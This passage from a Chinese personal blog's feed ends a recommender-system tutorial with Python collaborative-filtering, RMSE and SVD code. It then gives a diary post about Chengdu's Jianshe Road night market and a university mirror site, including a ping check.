class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">item_prediction <span class="token operator">=</span> predict<span class="token punctuation">(</span>train_data_matrix<span class="token punctuation">,</span> item_similarity<span class="token punctuation">,</span> <span class="token builtin">type</span> <span class="token operator">=</span> <span class="token string">'item'</span><span class="token punctuation">)</span>user_prediction <span class="token operator">=</span> predict<span class="token punctuation">(</span>train_data_matrix<span class="token punctuation">,</span> user_similarity<span class="token punctuation">,</span> <span class="token builtin">type</span> <span class="token operator">=</span> <span class="token string">'user'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>item_prediction<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>item_prediction<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>np<span class="token punctuation">.</span>argsort<span class="token punctuation">(</span>item_prediction<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>计算均方误差 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">rmse</span><span class="token punctuation">(</span>prediction<span class="token punctuation">,</span> ground_truth<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 计算均方误差</span>    <span class="token comment">#nonzero(a)返回数组a中值不为零的元素的下标</span>    <span class="token comment">#flatten()创建矩阵</span>    prediction <span class="token operator">=</span> prediction<span class="token punctuation">[</span>ground_truth<span class="token punctuation">.</span>nonzero<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span>flatten<span class="token punctuation">(</span><span class="token punctuation">)</span>    ground_truth <span class="token operator">=</span> ground_truth<span class="token punctuation">[</span>ground_truth<span class="token punctuation">.</span>nonzero<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span>flatten<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> sqrt<span class="token punctuation">(</span>mean_squared_error<span class="token punctuation">(</span>prediction<span class="token punctuation">,</span> ground_truth<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'User based CF RMSE: '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>rmse<span class="token punctuation">(</span>user_prediction<span class="token punctuation">,</span> test_data_matrix<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Item based CF RMSE: '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>rmse<span class="token punctuation">(</span>item_prediction<span class="token punctuation">,</span> test_data_matrix<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p>SVD分解的方法，其中k是特征值个数，指定将分解为<span class="math inline">\(m*k\)</span>和<span class="math inline">\(k*n\)</span>，中间的对角矩阵有k个特征值 &gt;k: int, optional,Number of singular values and vectors to compute. Must be 1 &lt;= k &lt; min(A.shape)</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">u<span class="token punctuation">,</span> s<span class="token punctuation">,</span> vt <span class="token operator">=</span> svds<span class="token punctuation">(</span>train_data_matrix<span class="token punctuation">,</span> k<span class="token operator">=</span><span class="token number">500</span><span class="token punctuation">)</span>s_diag_matrix <span class="token operator">=</span> np<span class="token punctuation">.</span>diag<span class="token punctuation">(</span>s<span class="token punctuation">)</span>X_pred <span class="token operator">=</span> np<span class="token punctuation">.</span>dot<span class="token punctuation">(</span>np<span class="token punctuation">.</span>dot<span class="token punctuation">(</span>u<span class="token punctuation">,</span> s_diag_matrix<span class="token punctuation">)</span><span class="token punctuation">,</span> vt<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'User-based CF MSE: '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>rmse<span class="token punctuation">(</span>X_pred<span class="token punctuation">,</span> test_data_matrix<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>参考</p><p><span class="exturl" data-url="aHR0cHM6Ly9sdW1pbmdkb25nLmNuL3JlY29tbWVuZGF0aW9uLWFsZ29yaXRobS1iYXNlZC1vbi1tYXRyaXgtZGVjb21wb3NpdGlvbi5odG1s">基于矩阵分解的推荐算法<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3FjeW1reHljL1JlY1N5cw==">项亮的《推荐系统实践》的代码实现<i class="fa fa-external-link-alt"></i></span></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;等待填坑</summary>
    
    
    
    <category term="笔记&amp;札记" scheme="https://zhangjk98.xyz/categories/%E7%AC%94%E8%AE%B0-%E6%9C%AD%E8%AE%B0/"/>
    
    
    <category term="推荐系统" scheme="https://zhangjk98.xyz/tags/%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>沙河夜市</title>
    <link href="https://zhangjk98.xyz/f641/"/>
    <id>https://zhangjk98.xyz/f641/</id>
    <published>2019-10-15T14:05:12.000Z</published>
    <updated>2019-10-15T14:05:12.000Z</updated>
    
    <content type="html"><![CDATA[<p>这几天走过泥电沙河边上的建设路，早上晨光熹微，夜间车马喧嚣，仿佛回到了高二高三在一中上学的日子。 <a id="more"></a> 晚上路过建设路，卖小吃的沿街店铺生意似乎很火爆。到底还是网红街，比清水河西门外一片濒临倒闭的冷清店铺红火多了，显不出一点稳中向好共克时艰的样子。然而我这几天却没看到多少麻雀在路边找吃的，可能是人实在太多不太敢来吧。沙河校内倒是有些珠颈斑鸠和白颊噪鹛在路边捡樟树果子吃。鸟没看到，不到一周的时间却见了三次老鼠行色匆匆，穿梭在摊位间，可能是要回家养四个龟 不喜欢辣的我路过建设路，没有胃口，每次大晚上的走过去居然一点也不饿。</p><p>今天实习回来的师姐请我们吃螺蛳粉，不习惯嗦粉并不知道哪里好吃。 听说建设路吃的自从炒作过度就不如以前了，我也不晓得，反正没有市井气息，像旅游区。看那个某签签土豆每天都有那么多人在排队，我就好奇一个土豆到底有什么好吃的。反正去了西伯利亚，天天都有土豆吃。 这些跟我一个低端人口又有什么关系呢 浮世繁华，与我无关。 16年涨了房价的成都不像是那首不知道怎么火的《成都》，倒像是《北京北京》。 咖啡馆离广场有三个街区，仿佛霓虹灯到月亮的距离，哦，不对，成都看不到月亮。</p><p>晚上回到租的房子，八二信箱家属区，老房子刷了一层屎黄色的漆，那感觉，和当年我长大的物探小区刷了一层红色的漆一样难受。我果然还是喜欢老小区。</p><p>成都夜雨，点点滴滴到天明</p><p><strong><em>对了，泥电的镜像源要上了，不来试试吗</em></strong> <span class="exturl" data-url="aHR0cDovL21pcnJvcnMudWVzdGMuY24=">电子科技大学开源镜像站<i class="fa fa-external-link-alt"></i></span> ~~202.115.22.207 ~~（需要校内IP） 电子科大镜像源自从凝聚的凉了以后终于要续上了</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">ping</span> <span class="token number">202.115</span>.22.207正在 Ping <span class="token number">202.115</span>.22.207 具有 <span class="token number">32</span> 字节的数据:来自 <span class="token number">202.115</span>.22.207 的回复: 字节<span class="token operator">=</span><span class="token number">32</span> 时间<span class="token operator">=</span>2ms <span class="token assign-left variable">TTL</span><span class="token operator">=</span><span class="token number">60</span>来自 <span class="token number">202.115</span>.22.207 的回复: 字节<span class="token operator">=</span><span class="token number">32</span> 时间<span class="token operator">&lt;</span>1ms <span class="token assign-left variable">TTL</span><span class="token operator">=</span><span class="token number">60</span>来自 <span class="token number">202.115</span>.22.207 的回复: 字节<span class="token operator">=</span><span class="token number">32</span> 时间<span class="token operator">=</span>1ms <span class="token assign-left variable">TTL</span><span class="token operator">=</span><span class="token number">60</span>来自 <span class="token number">202.115</span>.22.207 的回复: 字节<span class="token operator">=</span><span class="token number">32</span> 时间<span class="token operator">&lt;</span>1ms <span class="token assign-left variable">TTL</span><span class="token operator">=</span><span class="token number">60</span><span class="token number">202.115</span>.22.207 的 Ping 统计信息:    数据包: 已发送 <span class="token operator">=</span> <span class="token number">4</span>，已接收 <span class="token operator">=</span> <span class="token number">4</span>，丢失 <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">(</span><span class="token number">0</span>% 丢失<span class="token punctuation">)</span>，往返行程的估计时间<span class="token punctuation">(</span>以毫秒为单位<span class="token punctuation">)</span>:    最短 <span class="token operator">=</span> 0ms，最长 <span class="token operator">=</span> 2ms，平均 <span class="token operator">=</span> 0ms<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/mirrors.png" alt="Picture" style="zoom:80%;" /> <em>请忽略现在还妹有前端这个问题，据说已经在做了.jpg</em></p><p>更新，前端已经安排上了 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/mirrors1.png" alt="Picture" style="zoom:80%;" /></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;这几天走过泥电沙河边上的建设路，早上晨光熹微，夜间车马喧嚣，仿佛回到了高二高三在一中上学的日子。</summary>
    
    
    
    <category term="杂七杂八" scheme="https://zhangjk98.xyz/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"/>
    
    
  </entry>
  
</feed>
